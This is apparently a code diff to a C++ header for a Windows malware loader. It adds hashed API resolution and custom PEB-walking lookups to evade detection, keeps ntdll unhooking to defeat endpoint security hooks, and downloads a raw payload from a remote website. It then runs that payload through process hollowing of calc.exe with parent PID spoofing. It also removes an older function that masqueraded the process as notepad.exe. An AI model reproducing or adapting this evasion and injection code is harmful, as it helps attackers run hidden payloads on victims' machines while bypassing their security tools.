@@ -1,13 +1,215 @@
+#pragma once
 #include <Windows.h>
+#include <winternl.h>
 #include <iostream> 
 #include <tlhelp32.h>
 #include <tchar.h>
 #include <vector>
 #include <winhttp.h>
 #include <psapi.h>
-#include "Ven.h"
-
+#include <cassert>
+#include <ntstatus.h>
 #pragma comment(lib, "winhttp.lib")
+
+
+
+
+
+// Structures definitions
+typedef NTSYSAPI NTSTATUS(NTAPI* _NtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
+typedef NTSYSAPI NTSTATUS(NTAPI* _NtCreateThreadEx)(_Out_ PHANDLE hThread, _In_  ACCESS_MASK DesiredAccess, _In_  LPVOID ObjectAttributes, _In_  HANDLE ProcessHandle, _In_  LPTHREAD_START_ROUTINE lpStartAddress, _In_  LPVOID lpParameter, _In_  BOOL CreateSuspended, _In_  DWORD StackZeroBits, _In_  DWORD SizeOfStackCommit, _In_  DWORD SizeOfStackReserve, _Out_ LPVOID lpBytesBuffer);
+typedef NTSYSAPI NTSTATUS(NTAPI* _NtWriteVirtualMemory)(_In_ HANDLE ProcessHandle, _In_opt_ PVOID BaseAddress, _In_ VOID* Buffer, _In_ SIZE_T BufferSize, _Out_opt_ PSIZE_T NumberOfBytesWritten);
+typedef public NTSTATUS(NTAPI* _NtProtectVirtualMemory) (HANDLE, IN OUT PVOID*, IN OUT PSIZE_T, IN ULONG, OUT PULONG);
+typedef public NTSTATUS(NTAPI* _NtQueryInformationThread) (IN HANDLE ThreadHandle, IN THREADINFOCLASS ThreadInformationClass, OUT PVOID ThreadInformation, IN ULONG ThreadInformationLength, OUT PULONG ReturnLength);
+typedef public NTSTATUS(NTAPI* _NtCreateSection)(OUT PHANDLE SectionHandle, IN ULONG DesiredAccess, IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes, IN OPTIONAL PLARGE_INTEGER MaximumSize, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN OPTIONAL HANDLE FileHandle);
+typedef public NTSTATUS(NTAPI* _NtMapViewOfSection)(IN HANDLE SectionHandle, IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN ULONG_PTR ZeroBits, IN SIZE_T CommitSize, IN OUT OPTIONAL PLARGE_INTEGER SectionOffset, IN OUT PSIZE_T ViewSize, IN DWORD InheritDisposition, IN ULONG AllocationType, IN ULONG Win32Protect);
+typedef public NTSTATUS(NTAPI* _NtUnmapViewOfSection)(IN HANDLE ProcessHandle, IN PVOID BaseAddress OPTIONAL);
+typedef enum _SECTION_INHERIT : DWORD { ViewShare = 1, ViewUnmap = 2 } SECTION_INHERIT, * PSECTION_INHERIT;
+
+
+
+
+
+
+
+
+// Compile Time Functions definitions
+// Credits to MALDEVACADEMY
+// Generate a random key at compile time which is used as the initial hash
+constexpr int RandomCompileTimeSeed(void)
+{
+    return '0' * -40271 +
+        __TIME__[7] * 1 +
+        __TIME__[6] * 10 +
+        __TIME__[4] * 60 +
+        __TIME__[3] * 600 +
+        __TIME__[1] * 3600 +
+        __TIME__[0] * 36000;
+};
+
+// The compile time random seed
+constexpr auto g_KEY = RandomCompileTimeSeed() % 0xFF;
+
+// Compile time Djb2 hashing function (ASCII)
+#define SEED 5
+constexpr DWORD HashStringDjb2A(const char* String) {
+    ULONG Hash = (ULONG)g_KEY;
+    INT c = 0;
+    while ((c = *String++)) {
+        Hash = ((Hash << SEED) + Hash) + c;
+    }
+    return Hash;
+}
+
+// runtime hashing macros
+#define RTIME_HASHA( API ) HashStringDjb2A((const char*) API)
+constexpr auto ntcreate_Rotr32A = HashStringDjb2A("NtCreateSection");
+constexpr auto ntmap_Rotr32A = HashStringDjb2A("NtMapViewOfSection");
+constexpr auto ntunmap_Rotr32A = HashStringDjb2A("NtUnmapViewOfSection");
+constexpr auto ntalloc_Rotr32A = HashStringDjb2A("NtAllocateVirtualMemory");
+constexpr auto ntprotect_Rotr32A = HashStringDjb2A("NtProtectVirtualMemory");
+constexpr auto ntcreatethread_Rotr32A = HashStringDjb2A("NtCreateThreadEx");
+constexpr auto ntwrite_Rotr32A = HashStringDjb2A("NtWriteVirtualMemory");
+constexpr auto ntquery_Rotr32A = HashStringDjb2A("NtQueryInformationThread");
+
+// static variables
+char path[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l',0 };
+char sntdll[] = { '.','t','e','x','t',0 };
+char _ntdll[] = { 'n','t','d','l','l','.','d','l','l',0 };
+
+
+
+
+
+
+
+// Static functions definitions
+
+/**
+* Credits to MALDEVACADEMY
+* Compares two strings (case insensitive)
+*/
+BOOL IsStringEqual(IN LPCWSTR Str1, IN LPCWSTR Str2) {
+    WCHAR   lStr1[MAX_PATH],
+        lStr2[MAX_PATH];
+
+    int		len1 = lstrlenW(Str1),
+        len2 = lstrlenW(Str2);
+
+    int		i = 0,
+        j = 0;
+    // Checking length. We dont want to overflow the buffers
+    if (len1 >= MAX_PATH || len2 >= MAX_PATH)
+        return FALSE;
+    // Converting Str1 to lower case string (lStr1)
+    for (i = 0; i < len1; i++) {
+        lStr1[i] = (WCHAR)tolower(Str1[i]);
+    }
+    lStr1[i++] = L'\0'; // null terminating
+    // Converting Str2 to lower case string (lStr2)
+    for (j = 0; j < len2; j++) {
+        lStr2[j] = (WCHAR)tolower(Str2[j]);
+    }
+    lStr2[j++] = L'\0'; // null terminating
+    // Comparing the lower-case strings
+    if (lstrcmpiW(lStr1, lStr2) == 0)
+        return TRUE;
+    return FALSE;
+}
+
+
+
+
+
+/**
+* Credits to MALDEVACADEMY
+* Retrieves the base address of a module from the PEB
+* and enumerates the linked list of modules to find the correct one.
+*/
+HMODULE CustomGetModuleHandle(IN char szModuleName[]) {
+    // convert char to LPCWSTR
+    int wideStrLen = MultiByteToWideChar(CP_UTF8, 0, szModuleName, -1, nullptr, 0);
+    wchar_t* wideStr = new wchar_t[wideStrLen];
+    MultiByteToWideChar(CP_UTF8, 0, szModuleName, -1, wideStr, wideStrLen);
+    LPCWSTR lpWideStr = wideStr;
+    // Getting PEB
+#ifdef _WIN64 // if compiling as x64
+    PPEB			pPeb = (PEB*)(__readgsqword(0x60));
+#elif _WIN32 // if compiling as x32
+    PPEB			pPeb = (PEB*)(__readfsdword(0x30));
+#endif// Getting Ldr
+    PPEB_LDR_DATA		    pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
+    // Getting the first element in the linked list which contains information about the first module
+    PLDR_DATA_TABLE_ENTRY	pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);
+    while (pDte) {
+        // If not null
+        if (pDte->FullDllName.Length != NULL) {
+            // Check if both equal
+            if (IsStringEqual(pDte->FullDllName.Buffer, lpWideStr)) {
+                //wprintf(L"[+] Module found from PEB : \"%s\" \n", pDte->FullDllName.Buffer);
+                return(HMODULE)pDte->Reserved2[0];
+            }
+        }
+        else {
+            break;
+        }
+        // Next element in the linked list
+        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
+    }
+    wprintf(L"[+] Module not found in PEB");
+    return NULL;
+}
+
+
+
+
+/** 
+* Credits to MALDEVACADEMY
+* Retrieves the address of an exported function from a specified module handle. 
+* The function returns NULL if the function name is not found in the specified module handle.
+*/
+FARPROC CustomGetProcAddress(IN HMODULE hModule, IN DWORD lpApiName) {
+    if (hModule == NULL)
+		return NULL;
+    // We do this to avoid casting at each time we use 'hModule'
+    PBYTE pBase = (PBYTE)hModule;
+    // Getting the dos header and doing a signature check
+    PIMAGE_DOS_HEADER	pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
+    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
+        return NULL;
+    // Getting the nt headers and doing a signature check
+    PIMAGE_NT_HEADERS	pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
+    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
+        return NULL;
+    // Getting the optional header
+    IMAGE_OPTIONAL_HEADER	ImgOptHdr = pImgNtHdrs->OptionalHeader;
+    // Getting the image export table
+    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+    // Getting the function's names array pointer
+    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
+    // Getting the function's addresses array pointer
+    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
+    // Getting the function's ordinal array pointer
+    PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);
+    // Looping through all the exported functions
+    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
+        // Getting the name of the function
+        char* pFunctionName = (char*)(pBase + FunctionNameArray[i]);
+
+        // Getting the address of the function through its ordinal
+        PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);
+        
+        // Searching for the function specified
+        if (lpApiName == RTIME_HASHA(pFunctionName)) {
+            printf("\t[+] Function %s found at address 0x%p with ordinal %d\n", pFunctionName, pFunctionAddress, FunctionOrdinalArray[i]);
+            return (FARPROC)pFunctionAddress;
+        }
+    }
+    printf("\n\t[!] Function with hash %lu not found\n", lpApiName);
+    return NULL;
+}
+
+
 
 
 
@@ -29,6 +231,7 @@ BOOL isItHooked(LPVOID addr) {
 
 
 
+
 /**
 *   Check if common critical functions are hooked or not
 *   If they are hooked, the function will map in memory
@@ -38,28 +241,26 @@ BOOL isItHooked(LPVOID addr) {
 */
 void unhook() {
     printf("[+] Detecting ntdll hooks\n");
-    int nbHooks = 0;
-    if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory"))) {
+    int nbHooks = 0;    
+    if (isItHooked(CustomGetProcAddress(CustomGetModuleHandle(_ntdll), ntalloc_Rotr32A ))) {
         nbHooks++;
     }
-    if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory"))) {
+    if (isItHooked(CustomGetProcAddress(CustomGetModuleHandle(_ntdll), ntprotect_Rotr32A))) {
         nbHooks++;
     }
-    if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx"))) {
+    if (isItHooked(CustomGetProcAddress(CustomGetModuleHandle(_ntdll), ntcreatethread_Rotr32A))) {
         nbHooks++;
     }
-    if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationThread"))) {
+    if (isItHooked(CustomGetProcAddress(CustomGetModuleHandle(_ntdll), ntquery_Rotr32A))) {
         nbHooks++;
     }
     if (nbHooks > 0) {
         printf("[+] Unhooking ntdll from a fresh memory alloc\n");
-        char path[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l',0 };
-        char sntdll[] = { '.','t','e','x','t',0 };
         HANDLE process = GetCurrentProcess();
         MODULEINFO mi = {};
         // our current process ntdll module
-        HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
-        GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
+        PVOID ntdllModule = CustomGetModuleHandle(_ntdll);
+        GetModuleInformation(process, (HMODULE) ntdllModule, &mi, sizeof(mi));
         LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
         // create a mapped copy of the ntdll.ddl file from disk
         HANDLE ntdllFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
@@ -79,24 +280,24 @@ void unhook() {
         }
         // Redefine Nt functions
         printf("[+] Redefining Nt functions\n");
-        HINSTANCE hNtdll = GetModuleHandleA("ntdll.dll");
-        _NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
-        _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
-        _NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
-        _NtCreateThreadEx NtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
-        _NtQueryInformationThread NtQueryInformationThread = (_NtQueryInformationThread)GetProcAddress(hNtdll, "NtQueryInformationThread");
+        HMODULE hNtdll = CustomGetModuleHandle(_ntdll);
+        _NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)CustomGetProcAddress(hNtdll, ntalloc_Rotr32A);
+        _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)CustomGetProcAddress(hNtdll, ntwrite_Rotr32A);
+        _NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory)CustomGetProcAddress(hNtdll, ntprotect_Rotr32A);
+        _NtCreateThreadEx NtCreateThreadEx = (_NtCreateThreadEx)CustomGetProcAddress(hNtdll, ntcreatethread_Rotr32A);
+        _NtQueryInformationThread NtQueryInformationThread = (_NtQueryInformationThread)CustomGetProcAddress(hNtdll, ntquery_Rotr32A);
         printf("[+] Detecting hooks in new ntdll module\n");
         nbHooks = 0;
-        if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory"))) {
+        if (isItHooked(CustomGetProcAddress(CustomGetModuleHandle(_ntdll), ntalloc_Rotr32A))) {
             nbHooks++;
         }
-        if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory"))) {
+        if (isItHooked(CustomGetProcAddress(CustomGetModuleHandle(_ntdll), ntprotect_Rotr32A))) {
             nbHooks++;
         }
-        if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx"))) {
+        if (isItHooked(CustomGetProcAddress(CustomGetModuleHandle(_ntdll), ntcreatethread_Rotr32A))) {
             nbHooks++;
         }
-        if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationThread"))) {
+        if (isItHooked(CustomGetProcAddress(CustomGetModuleHandle(_ntdll), ntquery_Rotr32A))) {
             nbHooks++;
         }
         if (nbHooks > 0) {
@@ -112,46 +313,8 @@ void unhook() {
 
 
 
-
-
-
-
-
-
-
 /**
-*   Masquerade our current process commandline and imagepathname
-*   by modifying the Process Environement Block (PEB)
-*/
-void hidePEB() {
-    printf("[+] Masquerading process in PEB\n");
-    HANDLE h = GetCurrentProcess();
-    PROCESS_BASIC_INFORMATION ProcessInformation;
-    ULONG lenght = 0;
-    HINSTANCE ntdll;
-    typedef NTSTATUS(*MYPROC) (HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
-    MYPROC GetProcessInformation;
-    wchar_t commandline[] = L"C:\\windows\\system32\\notepad.exe";
-    ntdll = LoadLibrary(TEXT("Ntdll.dll"));
-    GetProcessInformation = (MYPROC)GetProcAddress(ntdll, "NtQueryInformationProcess");
-    //get _PEB object
-    (GetProcessInformation)(h, ProcessBasicInformation, &ProcessInformation, sizeof(ProcessInformation), &lenght);
-    //replace commandline and imagepathname
-    ProcessInformation.PebBaseAddress->ProcessParameters->CommandLine.Buffer = commandline;
-    ProcessInformation.PebBaseAddress->ProcessParameters->ImagePathName.Buffer = commandline;
-}
-
-
-
-
-
-
-
-
-
-
-/**
-*   Download a raw payload from an external website
+*   Download a raw payload from an external website into a buffer
 */
 std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
     printf("[+] Downloading remote payload\n");
@@ -206,11 +369,6 @@ DWORD GetPID() {
 
 
 
-
-
-
-
-
 /**
 *   Execute our raw payload by creating a suspended process (Process Hollowing)
 *   with a custom thread attribute list to spoof its parent PID (PPID spoofing)
@@ -234,10 +392,10 @@ void execution(std::vector<BYTE> sh, DWORD exPID) {
     CreateProcessA(NULL, (LPSTR)"C:\\Windows\\System32\\calc.exe", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
     HANDLE victimProcess = pi.hProcess;
     HANDLE threadHandle = pi.hThread;
-    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
-    NtCreateSection ntCreateSection = (NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
-    NtMapViewOfSection ntMapViewOfSection = (NtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
-    NtUnmapViewOfSection ntUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
+    HMODULE hNtdll = CustomGetModuleHandle(_ntdll);
+    _NtCreateSection ntCreateSection = (_NtCreateSection)CustomGetProcAddress(hNtdll, ntcreate_Rotr32A);
+    _NtMapViewOfSection ntMapViewOfSection = (_NtMapViewOfSection)CustomGetProcAddress(hNtdll, ntmap_Rotr32A);
+    _NtUnmapViewOfSection ntUnmapViewOfSection = (_NtUnmapViewOfSection)CustomGetProcAddress(hNtdll, ntunmap_Rotr32A);
     // create section in local process
     HANDLE hSection;
     LARGE_INTEGER szSection = { sh.size() };
@@ -270,4 +428,6 @@ void execution(std::vector<BYTE> sh, DWORD exPID) {
     ResumeThread(threadHandle);
     status = ntUnmapViewOfSection(victimProcess,hLocalAddress);
 }
+
+
 
